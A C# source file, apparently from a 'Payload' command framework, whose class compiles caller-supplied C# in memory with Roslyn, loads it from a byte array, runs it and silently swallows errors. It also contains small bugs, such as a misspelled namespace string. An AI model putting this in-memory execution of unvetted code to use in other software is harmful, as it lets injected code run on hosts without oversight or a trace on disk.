using CommonClassLibrary;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CSharp;
using Payload.Command;
using Payload.Command.Interface;
using System;
using System.CodeDom;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Payload.Core.Command
{
    public class CSharpExecuteCommand : Payload.Command.Interface.ICommand
    {
        public string TargetCSharpCode { get; set; }

        private void ExecuteCSharp(string source, string methodname= "mymethod", string classname = "myclass", List<string> usingList =null, List<string> importList=null)
        {
            if(usingList==null) usingList = new List<string>() { "Payload.Core.Command" };
            if(importList==null) importList = new List<string>() { "Payload.Core.Command" };
            //Create method
            CodeMemberMethod pMethod = new CodeMemberMethod();
            pMethod.Name = methodname;
            pMethod.Attributes = MemberAttributes.Public;
            //pMethod.Parameters.Add(new CodeParameterDeclarationExpression(typeof(string[]), "boxes"));
            pMethod.ReturnType = new CodeTypeReference(typeof(bool));
            pMethod.Statements.Add(new CodeSnippetExpression(@"
            bool result = true;
            try
            {
                " + source + @"
            }
            catch
            {
                result = false;
            }
            return result;
            "));

            //Crée la classe
            CodeTypeDeclaration pClass =
              new System.CodeDom.CodeTypeDeclaration(classname);
            pClass.Attributes = MemberAttributes.Public;
            pClass.Members.Add(pMethod);
            //Crée le namespace
            CodeNamespace pNamespace = new CodeNamespace("myNameSpace");
            pNamespace.Types.Add(pClass);
            foreach (string sUsing in usingList)
                pNamespace.Imports.Add(new
                  CodeNamespaceImport(sUsing));

            //Create compile unit
            CodeCompileUnit pUnit = new CodeCompileUnit();
            pUnit.Namespaces.Add(pNamespace);
            //Make compilation parameters
            CompilerParameters pParams =
              new CompilerParameters((string[])importList.ToArray<string>());
            pParams.GenerateInMemory = true;
            //Compile
            CompilerResults pResults = (new CSharpCodeProvider()).CreateCompiler().CompileAssemblyFromDom(pParams, pUnit);

            if (pResults.Errors != null && pResults.Errors.Count > 0)
                foreach (CompilerError pError in pResults.Errors)
                    Console.WriteLine(pError.ToString());

            var r = pResults.CompiledAssembly.CreateInstance("myNameSp ace." + classname);
        }

        private (Assembly assembly, string log) CompileCode(string sourceCode)
        {
            var syntaxTree = CSharpSyntaxTree.ParseText(sourceCode);
            var references = new[]
            {
                MetadataReference.CreateFromFile(typeof(object).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(Console).Assembly.Location),
                // Add necessary references for .NET 8
                MetadataReference.CreateFromFile(typeof(System.Runtime.GCSettings).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Threading.Tasks.ValueTask).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(Payload.Core.Command.DemoCommand).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Threading.Tasks.Task).Assembly.Location), // System.Threading.Tasks
                MetadataReference.CreateFromFile(typeof(decimal).Assembly.Location), // System.Private.CoreLib
                //MetadataReference.CreateFromFile(typeof(Microsoft.CSharp.CSharpCodeProvider).Assembly.Location),
                MetadataReference.CreateFromFile(@"C:\Program Files\dotnet\shared\Microsoft.NETCore.App\8.0.7\System.Runtime.dll"),
            };

            CSharpCompilation compilation = CSharpCompilation.Create(
                "DynamicAssembly",
                new[] { syntaxTree },
                references,
                new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary));

            using (var ms = new MemoryStream())
            {
                var result = compilation.Emit(ms);
                var log = new StringBuilder();

                if (!result.Success)
                {
                    foreach (var diagnostic in result.Diagnostics)
                    {
                        log.AppendLine(diagnostic.ToString());
                    }
                    return (null, log.ToString());
                }

                ms.Seek(0, SeekOrigin.Begin);
                var assembly = Assembly.Load(ms.ToArray());
                return (assembly, log.ToString());
            }
        }

        public override Task Execute()
        {
            string _code = @"
        using System;
        using System.Collections.Generic;
        using System.Text;
        using System.Threading.Tasks;
        using Payload.Core.Command;
        using System.Reflection;
        [assembly: global::System.Runtime.Versioning.TargetFrameworkAttribute("".NETCoreApp,Version=v8.0"", FrameworkDisplayName = "".NET 8.0"")]
        public class HelloWorld
        {
            public bool SayHello()
            {
                bool result = true;
                try
                {
                    " + TargetCSharpCode + @"
                }
                catch
                {
                    result = false;
                }
                
                Console.WriteLine(""Hello, World!"");
                return result;
            }
        }";

            string code = @"
        using System;

        public class HelloWorld
        {
            public void SayHello()
            {
                Console.WriteLine(""Hello, World!"");
            }
        }";

            try
            {
                //ExecuteCSharp(_code);
                var(assembly, log)  = CompileCode(_code);
                // Log the compilation result
                Console.WriteLine("Compilation Log:");
                Console.WriteLine(log);
                if (assembly != null)
                {
                    var type = assembly.GetType("HelloWorld");
                    var instance = Activator.CreateInstance(type);
                    type.GetMethod("SayHello").Invoke(instance, null);
                }
            }
            catch(Exception ex)
            {
#if DEBUG
                Console.WriteLine (ex.ToString());
#endif
            }
            return null;
        }
    }
}
